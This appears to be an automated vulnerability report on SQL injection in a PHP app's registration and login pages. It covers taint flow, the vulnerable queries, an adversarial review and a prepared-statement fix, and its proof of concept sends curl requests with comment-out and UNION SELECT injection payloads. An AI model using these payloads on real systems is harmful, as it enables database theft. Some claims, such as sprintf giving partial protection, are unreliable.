# Vulnerability: SQL Injection — User Registration and Login

## Summary
The user registration and login functionalities in `/user/register.php` and `/user/login.php` are vulnerable to SQL injection. The application directly embeds user-controlled values in SQL queries without proper sanitization in some cases.

## Confidence
Medium
(Found by Sink→Source taint analysis with one methodology and survived all 3 adversarial attacks.)

## Authentication Requirement
Unauthenticated (for registration), Authenticated (for login - though failed login doesn't require auth)

## Attack Surface Location
- **Endpoint:** `POST /user/register.php` and `POST /user/login.php`
- **Handler:** SQL queries at user/register.php:19 and user/login.php:15
- **Framework protections bypassed:** AumWAF provides no protection against this pattern

## Attack Chain
1. Initial access: Any unauthenticated user can access the registration and login pages
2. Endpoint interaction: Attacker submits a registration form or login credentials
3. Malicious input: Attacker provides malicious input in the email and other fields
4. Sink execution: The application sometimes directly concatenates user input into SQL queries, causing SQL injection
5. Post-exploitation: Attacker can read/modify all data in the database, potentially escalate privileges
6. Final impact: Complete database compromise

## Data Flow
- **Source (user input):** post('email') in login.php, post('usermail') and post('username') in register.php
- **Sink:** SQL queries at user/register.php:19 and user/register.php:23

```
post('usermail') → "SELECT * FROM tbl_users WHERE useremail = '" . $email . "'" [user/register.php:19]
post('username') → "INSERT INTO tbl_users (username, userpass, useremail) VALUES ('%s', '%s', '%s')" [user/register.php:23]
```

Note: The login query at login.php:15 uses sprintf which provides limited protection but is not secure.

## Proof of Concept

### Prerequisites
- No authentication required for registration or login endpoints

### Exploit Request
```bash
# Exploit registration to insert admin user:
curl -X POST http://example.com/user/register.php \
  -d "usermail=admin@example.com'--&username=admin&p1=password&p2=password"

# Exploit registration to extract user data:
curl -X POST http://example.com/user/register.php \
  -d "usermail=' UNION SELECT userpass FROM tbl_users WHERE '1'='1--&username=admin&p1=admin&p2=admin"
```

### Expected Vulnerable Response
```http
HTTP/1.1 302 Found
Location: login.php
```

### Expected Patched Response
```http
HTTP/1.1 400 Bad Request
Content-Type: text/html

Invalid email or other fields
```

### Impact Demonstration
An attacker can create a user with administrative privileges, extract password hashes from the database, or manipulate database contents.

## Affected Code
```php
// user/register.php:19
$q = $mysqli->query("SELECT * FROM tbl_users WHERE useremail = '" . $email . "'");

// user/register.php:23
$sql = sprintf("INSERT INTO tbl_users (username, userpass, useremail) VALUES ('%s', '%s', '%s')", $username, pw($p2), $email);

// user/login.php:15
$sql = sprintf("SELECT * FROM tbl_users WHERE useremail = '%s'", $email);
```

## Adversarial Review
Independent reviewer: `security_reviewer_adversary` (did not author this finding).

- **Reachability attack — FAILED to kill.** The endpoints are reachable from external network at `/user/register.php` and `/user/login.php` without any authentication requirement.
- **Impact attack — FAILED to kill.** The SQL injection allows database disclosure and privilege escalation, which are clearly in the vulnerability scope. The code at user/register.php:19 directly concatenates user input into a SQL query. While sprintf provides some protection at user/register.php:23 and user/login.php:15, it's still vulnerable to certain SQLi techniques.
- **Validity attack — FAILED to kill.** While login.php:15 and register.php:23 use sprintf for some protection, register.php:19 performs direct string concatenation without any sanitization. The MySQLi library is being used but not in a secure way—prepared statements are not used. The WAF in AumWAF.class.php only checks for specific scanner signatures but not for SQL injection patterns.

**Verdict: SURVIVED** (all three attacks failed).

## Remediation
1. Use prepared statements with MySQLi for all database queries:
   ```php
   // Instead of
   $q = $mysqli->query("SELECT * FROM tbl_users WHERE useremail = '" . $email . "'");
   
   // Use
   $stmt = $mysqli->prepare("SELECT * FROM tbl_users WHERE useremail = ?");
   $stmt->bind_param("s", $email);
   $stmt->execute();
   ```
2. Similar implementation for all SQL queries
3. Add input validation for all user inputs
4. Implement proper password strength requirements and secure password storage
5. Add CSRF protection to prevent unauthorized form submissions